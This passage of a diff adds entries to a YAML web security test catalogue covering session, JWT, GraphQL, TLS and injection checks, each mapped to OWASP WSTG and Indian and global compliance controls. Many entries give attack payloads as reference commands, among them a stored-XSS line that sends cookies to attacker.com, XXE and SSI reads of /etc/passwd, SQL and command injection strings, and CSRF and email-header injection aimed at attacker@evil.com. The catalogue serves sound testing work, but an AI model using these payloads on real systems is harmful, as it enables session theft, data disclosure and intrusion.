+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify session ID changes after authentication."
+          - "Capture pre-login session ID."
+          - "Login."
+          - "Compare post-login session ID."
+          - "Expected Secure Result: New session ID issued after successful authentication (old one invalidated)."
+          - "Reference Commands: Burp Suite - compare Set-Cookie before/after login (Repeater)"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-03"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-025"
+        title: "[WSTG-SESS-04] Test for Exposed Session Variables"
+        category: "Session Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Check if session tokens leak via URL/GET/logs/referrer."
+          - "Check if session ID appears in URL."
+          - "Check Referer header leakage to third parties."
+          - "Review server/proxy logs for tokens."
+          - "Expected Secure Result: Session tokens never appear in URLs, logs, or Referer headers."
+          - "Reference Commands: curl -v https://target.com/page?sessionid=... | Burp Suite - check Referer header on outbound requests"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-04"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-026"
+        title: "[WSTG-SESS-05] Test Cross Site Request Forgery (CSRF)"
+        category: "Session Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify state-changing requests require anti-CSRF tokens."
+          - "Identify state-changing endpoints (POST/PUT/DELETE)."
+          - "Remove/replace CSRF token and resend."
+          - "Build PoC HTML form to auto-submit cross-origin."
+          - "Expected Secure Result: Requests without valid CSRF token are rejected; token validated server-side per session."
+          - "Reference Commands: Burp Suite - Generate CSRF PoC | <form action='https://target.com/change-email' method='POST'><input name='email' value='attacker@evil.com'></form>"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-05"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-027"
+        title: "[WSTG-SESS-06] Test Logout Functionality"
+        category: "Session Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify logout fully invalidates the session server-side."
+          - "Login and capture session token."
+          - "Logout."
+          - "Replay the old token against protected endpoint."
+          - "Expected Secure Result: Old session token rejected (401/403) immediately after logout."
+          - "Reference Commands: curl https://target.com/account -H 'Cookie: session=<old_token_after_logout>'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-06"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-028"
+        title: "[WSTG-SESS-07] Test Session Timeout"
+        category: "Session Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify sessions expire after inactivity/absolute timeout."
+          - "Login and remain idle past expected timeout."
+          - "Attempt to use the session."
+          - "Verify absolute session lifetime also enforced."
+          - "Expected Secure Result: Session expires after reasonable idle timeout (e.g. 15-30 min) and absolute max lifetime."
+          - "Reference Commands: Manual timing test with Burp Repeater replay after idle period"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-07"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-07"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-029"
+        title: "[WSTG-SESS-08] Test for Session Puzzling"
+        category: "Session Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for logic flaws where session variables are misused across different modules."
+          - "Map how session variables are set/used across app modules."
+          - "Attempt to set a variable in one flow and abuse it in another (e.g. partial auth abuse)."
+          - "Expected Secure Result: Session variables scoped correctly; no cross-module abuse possible."
+          - "Reference Commands: Manual multi-step workflow testing with Burp Suite"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-08"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-08"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-030"
+        title: "[WSTG-SESS-09] Test for Session Hijacking"
+        category: "Session Management"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify session tokens can't be stolen/reused from another context (network/XSS)."
+          - "Test if session travels over HTTP."
+          - "Test XSS-based token theft feasibility."
+          - "Test token binding to IP/device fingerprint if applicable."
+          - "Expected Secure Result: Session cannot be hijacked; TLS-only, HttpOnly cookies, optional device binding."
+          - "Reference Commands: Wireshark - capture traffic for session token in cleartext | Burp - replay captured token from different IP/User-Agent"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-09"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-09"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-031"
+        title: "[WSTG-SESS-10] Test JSON Web Tokens (JWT)"
+        category: "Session Management"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["httpx_jwt"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test JWT implementation for alg=none, weak secret, signature bypass."
+          - "Decode JWT header/payload."
+          - "Test alg:none attack."
+          - "Brute-force HS256 secret."
+          - "Test signature stripping/kid parameter injection."
+          - "Expected Secure Result: JWT properly validates signature; strong secret/RS256 used; alg confusion not possible."
+          - "Reference Commands: jwt_tool <token> -T | python3 jwt_tool.py <token> -X a (alg none attack) | hashcat -m 16500 jwt.txt rockyou.txt"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-10"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-10"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-032"
+        title: "[WSTG-APIT-01] Test GraphQL"
+        category: "API Testing"
+        severity: "High"
+        execution_mode: "hybrid"
+        tool_binding: ["httpx_graphql","manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Assess GraphQL endpoint for introspection exposure, batching abuse, and injection."
+          - "Check if introspection query is enabled."
+          - "Test for excessive data exposure via nested queries."
+          - "Test query batching/DoS via deeply nested queries."
+          - "Test authorization on each resolver."
+          - "Expected Secure Result: Introspection disabled in production; query depth/complexity limited; authorization enforced per resolver."
+          - "Reference Commands: curl -X POST https://target.com/graphql -d '{\"query\":\"{__schema{types{name}}}\"}' | InQL / GraphQL Voyager for schema mapping"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (API & GraphQL Security Hardening)"
+            - "RBI Digital Payment Security Controls (API Gateway & Rate Limit Controls)"
+            - "OWASP WSTG v4.2: WSTG-APIT-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-APIT-01"
+            - "OWASP API Top 10: API1 BOLA, API3 BOPLA, API4 Resource Consumption"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: CC6.1"
+
+  - module_id: "TIR-CRYPTO"
+    name: "Cryptography, Transport & Data Protection Engine"
+    checks:
+      - id: "WEB-CRY-001"
+        title: "[WSTG-CRYP-01] Test for Weak Transport Layer Security"
+        category: "Cryptography"
+        severity: "High"
+        execution_mode: "automated"
+        tool_binding: ["testssl"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Assess SSL/TLS configuration for weak protocols/ciphers."
+          - "Scan supported TLS versions/ciphers."
+          - "Check certificate validity/chain."
+          - "Test for known TLS vulnerabilities (Heartbleed, POODLE, BEAST)."
+          - "Expected Secure Result: Only TLS 1.2/1.3 with strong ciphers enabled; no legacy protocol/vuln support."
+          - "Reference Commands: testssl.sh --full target.com | sslyze target.com | nmap --script ssl-enum-ciphers -p 443 target.com"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Encryption, Obfuscation & Masking)"
+            - "CERT-In CISG-2024-02 (CBOM Cryptographic Inventory)"
+            - "RBI Digital Payment Security Controls (End-to-End Encryption)"
+            - "OWASP WSTG v4.2: WSTG-CRYP-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CRYP-01"
+            - "OWASP Top 10: A02 Cryptographic Failures"
+            - "PCI DSS v4.0: Req. 3.5, 4.2.1"
+            - "ISO 27001:2022: A.8.24"
+            - "SOC 2: CC6.1, CC6.7"
+
+      - id: "WEB-CRY-002"
+        title: "[WSTG-CRYP-02] Test for Padding Oracle"
+        category: "Cryptography"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test CBC-mode encrypted data for padding oracle vulnerabilities."
+          - "Identify encrypted tokens/cookies using CBC."
+          - "Manipulate ciphertext blocks and observe error differences."
+          - "Attempt automated padding oracle attack."
+          - "Expected Secure Result: No distinguishable error behavior; padding oracle attack not feasible."
+          - "Reference Commands: padbuster https://target.com/page token_value 8 -cookies 'auth=token_value'"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Encryption, Obfuscation & Masking)"
+            - "CERT-In CISG-2024-02 (CBOM Cryptographic Inventory)"
+            - "RBI Digital Payment Security Controls (End-to-End Encryption)"
+            - "OWASP WSTG v4.2: WSTG-CRYP-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CRYP-02"
+            - "OWASP Top 10: A02 Cryptographic Failures"
+            - "PCI DSS v4.0: Req. 3.5, 4.2.1"
+            - "ISO 27001:2022: A.8.24"
+            - "SOC 2: CC6.1, CC6.7"
+
+      - id: "WEB-CRY-003"
+        title: "[WSTG-CRYP-03] Test for Sensitive Info Sent via Unencrypted Channels"
+        category: "Cryptography"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify sensitive data never transmitted over plaintext HTTP."
+          - "Capture full traffic during a full user session."
+          - "Filter for HTTP (non-TLS) requests."
+          - "Check for sensitive data in those requests."
+          - "Expected Secure Result: No sensitive data (credentials, tokens, PII) transmitted over unencrypted channels."
+          - "Reference Commands: Wireshark capture + filter http.request | mitmproxy -p 8080"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Encryption, Obfuscation & Masking)"
+            - "CERT-In CISG-2024-02 (CBOM Cryptographic Inventory)"
+            - "RBI Digital Payment Security Controls (End-to-End Encryption)"
+            - "OWASP WSTG v4.2: WSTG-CRYP-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CRYP-03"
+            - "OWASP Top 10: A02 Cryptographic Failures"
+            - "PCI DSS v4.0: Req. 3.5, 4.2.1"
+            - "ISO 27001:2022: A.8.24"
+            - "SOC 2: CC6.1, CC6.7"
+
+      - id: "WEB-CRY-004"
+        title: "[WSTG-CRYP-04] Test for Weak Encryption / Weak Randomness"
+        category: "Cryptography"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify weak/custom crypto algorithms or predictable random values (tokens, CSRF, reset links)."
+          - "Identify all generated tokens (session, reset, CSRF)."
+          - "Analyze randomness/entropy."
+          - "Review crypto algorithm choice (MD5/SHA1/DES/ECB)."
+          - "Expected Secure Result: Strong, industry-standard algorithms (AES-256, bcrypt/argon2, CSPRNG) used throughout."
+          - "Reference Commands: Burp Sequencer for entropy analysis | hashid <hash> (identify weak hash algo used)"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Encryption, Obfuscation & Masking)"
+            - "CERT-In CISG-2024-02 (CBOM Cryptographic Inventory)"
+            - "RBI Digital Payment Security Controls (End-to-End Encryption)"
+            - "OWASP WSTG v4.2: WSTG-CRYP-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CRYP-04"
+            - "OWASP Top 10: A02 Cryptographic Failures"
+            - "PCI DSS v4.0: Req. 3.5, 4.2.1"
+            - "ISO 27001:2022: A.8.24"
+            - "SOC 2: CC6.1, CC6.7"
+
+  - module_id: "TIR-INJECT"
+    name: "Injection, Protocol & Client-Side Parser Engine"
+    checks:
+      - id: "WEB-INJ-001"
+        title: "[WSTG-INPV-01] Test Reflected Cross Site Scripting (XSS)"
+        category: "Input Validation Testing"
+        severity: "High"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_injection"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify reflected XSS in parameters reflected in the response."
+          - "Identify all input parameters."
+          - "Inject XSS payloads."
+          - "Observe if payload executes/reflects unsanitized."
+          - "Test various contexts (HTML, attribute, JS)."
+          - "Expected Secure Result: All reflected input is properly encoded/sanitized; no script execution."
+          - "Reference Commands: <script>alert(document.cookie)</script> | \"><img src=x onerror=alert(1)> | ffuf -u 'https://target.com/search?q=FUZZ' -w xss-payloads.txt"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-01"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-002"
+        title: "[WSTG-INPV-02] Test Stored Cross Site Scripting (XSS)"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify persistent XSS stored in DB and rendered to other users."
+          - "Submit XSS payload in persistent fields (comments, profile)."
+          - "Reload page/view as different user."
+          - "Confirm execution."
+          - "Expected Secure Result: Stored input sanitized/encoded on output; no persistent script execution."
+          - "Reference Commands: <script>fetch('https://attacker.com/c?c='+document.cookie)</script>"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-02"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-003"
+        title: "[WSTG-INPV-03] Test HTTP Parameter Pollution"
+        category: "Input Validation Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test how app handles duplicate parameters."
+          - "Send requests with duplicate parameter names."
+          - "Observe which value the app/WAF processes."
+          - "Test for filter bypass via pollution."
+          - "Expected Secure Result: Application handles duplicate parameters consistently and securely; no logic bypass."
+          - "Reference Commands: curl 'https://target.com/search?id=1&id=2' | curl -X POST https://target.com/transfer -d 'amount=10&amount=10000'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-03"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-004"
+        title: "[WSTG-INPV-04] Test for SQL Injection"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_injection"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify SQL injection in all input vectors (GET/POST/headers/cookies)."
+          - "Identify DB-backed parameters."
+          - "Inject boolean/error-based/UNION payloads."
+          - "Confirm with time-based blind if needed."
+          - "Automate with sqlmap."
+          - "Expected Secure Result: All queries use parameterized statements; no SQLi possible across any vector."
+          - "Reference Commands: ' OR '1'='1 | ' UNION SELECT NULL,NULL-- - | sqlmap -u 'https://target.com/item?id=1' --batch --dbs | sqlmap -u 'https://target.com/login' --data='user=a&pass=b' -p pass"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-04"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-005"
+        title: "[WSTG-INPV-05] Test for LDAP Injection"
+        category: "Input Validation Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify LDAP injection in directory-service-backed input fields."
+          - "Identify LDAP-backed login/search fields."
+          - "Inject LDAP filter payloads."
+          - "Observe auth bypass/data disclosure."
+          - "Expected Secure Result: LDAP queries properly escape special characters; no filter injection possible."
+          - "Reference Commands: *)(uid=*))(|(uid=* | admin)(&))"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-05"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-006"
+        title: "[WSTG-INPV-06] Test for XML Injection"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_injection"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for XXE and XML injection in XML-consuming endpoints."
+          - "Identify XML input points (SOAP/file upload/API)."
+          - "Inject external entity payloads."
+          - "Test for SSRF/file disclosure via XXE."
+          - "Expected Secure Result: XML parser disables external entities (XXE disabled); no file/SSRF disclosure."
+          - "Reference Commands: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-06"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-007"
+        title: "[WSTG-INPV-07] Test for SSI Injection"
+        category: "Input Validation Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for Server-Side Include injection on .shtml or SSI-enabled pages."
+          - "Identify SSI-enabled endpoints."
+          - "Inject SSI directives."
+          - "Observe command execution/file disclosure."
+          - "Expected Secure Result: SSI directives not processed from user input; no command execution."
+          - "Reference Commands: <!--#exec cmd=\"id\"--> | <!--#include file=\"/etc/passwd\"-->"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-07"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-07"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-008"
+        title: "[WSTG-INPV-08] Test for XPath Injection"
+        category: "Input Validation Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test XML-database-backed queries for XPath injection."
+          - "Identify XPath-driven login/search."
+          - "Inject XPath boolean payloads."
+          - "Confirm auth bypass/data extraction."
+          - "Expected Secure Result: XPath queries parameterized/escaped; no injection possible."
+          - "Reference Commands: ' or '1'='1 | ' or ''='"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-08"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-08"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-009"
+        title: "[WSTG-INPV-09] Test IMAP/SMTP Injection"
+        category: "Input Validation Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test mail-related input fields for header/command injection."
+          - "Identify email-related input (contact form, password reset)."
+          - "Inject CRLF/header injection payloads."
+          - "Observe email header manipulation."
+          - "Expected Secure Result: Email input sanitized; CRLF injection blocked; no header manipulation."
+          - "Reference Commands: test@test.com%0ABcc:attacker@evil.com | test%0D%0ATo:victim@test.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-09"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-09"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-010"
+        title: "[WSTG-INPV-10] Test for Code Injection"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_injection"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for server-side code injection (PHP/Python eval, etc.)."
+          - "Identify parameters passed to eval/exec-like functions."
+          - "Inject language-specific code payloads."
+          - "Confirm code execution via output/behavior."
+          - "Expected Secure Result: No server-side code execution possible; input never passed to eval/exec."
+          - "Reference Commands: ;system('id'); | ${7*7}  (SSTI test) | {{7*7}} (Jinja2 SSTI test)"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-10"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-10"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-011"
+        title: "[WSTG-INPV-11] Test for Command Injection"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_injection"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for OS command injection in inputs passed to shell commands."
+          - "Identify parameters that may invoke system commands (ping, file ops)."
+          - "Inject command chaining payloads."
+          - "Confirm via time-delay or output-based blind testing."
+          - "Expected Secure Result: No OS command execution possible; input properly sanitized/uses safe APIs."
+          - "Reference Commands: ; id | | whoami | `sleep 10` | $(sleep 10) | commix --url='https://target.com/ping?ip=127.0.0.1'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-11"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-11"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-012"
+        title: "[WSTG-INPV-12] Test for Buffer Overflow"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
